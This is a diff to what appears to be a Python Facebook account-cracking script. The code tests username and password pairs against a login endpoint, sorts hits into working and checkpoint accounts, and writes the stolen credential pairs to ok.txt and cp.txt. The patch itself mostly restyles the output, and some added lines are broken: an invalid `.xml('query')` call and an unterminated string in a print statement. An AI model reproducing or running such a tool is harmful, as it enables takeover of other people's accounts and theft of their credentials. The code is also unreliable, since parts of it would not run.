@@ -19,7 +19,7 @@ def aink(s):
         sys.stdout.flush()
         time.sleep(1./300)
 def IPAND():
-    IP = requests.get('http://ip-api.com/xml').xml <query>
+    IP = requests.get('http://ip-api.com/xml').xml('query')
 def peak():
     time.sleep(0.1)
     print("""
@@ -125,23 +125,25 @@ def mbfv2():
                  print()
                  result += 1
                  if cek:
-                        life.append(username+"|"+password)
+                        life.append(username+"[▪]"+password)
                  else:
                         with open('ok.txt','a') as f:
                                 f.write(username + '|' + password + '\n')
              elif 'www.facebook.com' in response.json()['error_msg']:
-                   print(f"\r\033[1;93m  * --> {username}|{password}                    ",end="")
+                   print(f"\r\033[1;93m  * 👉 {username}[▪]{password}                    ",end="")
                    print()
                    check += 1
                    if cek:
-                           chek.append(username+"|"+password)
+                           chek.append(username+"[▪]"+password)
                    else:
                            with open('cp.txt','a') as f:
-                                f.write(username + '|' + password + '\n')
+                                f.write(username + '[▪]' + password + '\n')
              else:
                    die += 1
-             for i in list('\|/-•'):
-                            print(f"\r\033[00m [\033[1;91m{i}\033[00m] \033[96mokay \033[91m: \033[90m(\033[1;92m{str(result)}\033[90m) \033[93mcheckpoint \033[91m: \033[90m(\033[1;93m{str(check)}\033[90m) \033[91mMati : \033[90m(\033[1;94m{str(die)}\033[90m)\033[00m",end="")
+             for i in list('□■■■-■□■■-■■□■-■■■□'):
+                            print(f"\r\033[00m [\033[1;91m{i}\033[00m] \033[96mokay \033[91m: \033[90m(\033[1;92m{str(result)}\033[90m)")
+                            print("\033[93mcheckpoint \033[91m: \033[90m(\033[1;93m{str(check)}\033[90m)")
+                            print("\033[91mProses : \033[90m(\033[1;94m{str(die)}\033[90m)\033[00m",end=")
                             time.sleep(0.2)
          def getid(url):
              raw = requests.get(url,cookies=kuki).content
